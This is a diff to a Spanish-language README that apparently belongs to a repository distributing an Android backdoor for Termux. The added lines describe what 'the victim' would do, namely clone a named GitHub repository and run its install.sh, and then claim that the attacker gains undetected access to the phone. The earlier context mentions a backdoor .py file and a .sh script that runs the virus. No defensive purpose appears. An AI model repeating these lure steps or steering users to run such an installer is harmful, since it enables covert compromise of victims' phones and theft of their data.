@@ -31,3 +31,18 @@ NOTA: pueden checar el archivo .py para que se den cuenta como se veria un backd
 NOTA 2: Tambien les dejo el archivo .sh que seria el encargado de ejecutar el virus y darle los permisos, pueden checarlo.
 
 
+lo que su victima haria seria esto
+
+abrir termux
+
+ejecutar
+
+git clone https://github.com/byteSalgado/testingrepost/
+
+cd testingrepost
+chmod +x install.sh
+./install.sh
+
+listo nosotros ya tenemos el acceso a su telefono y sin ser detectados.
+
+
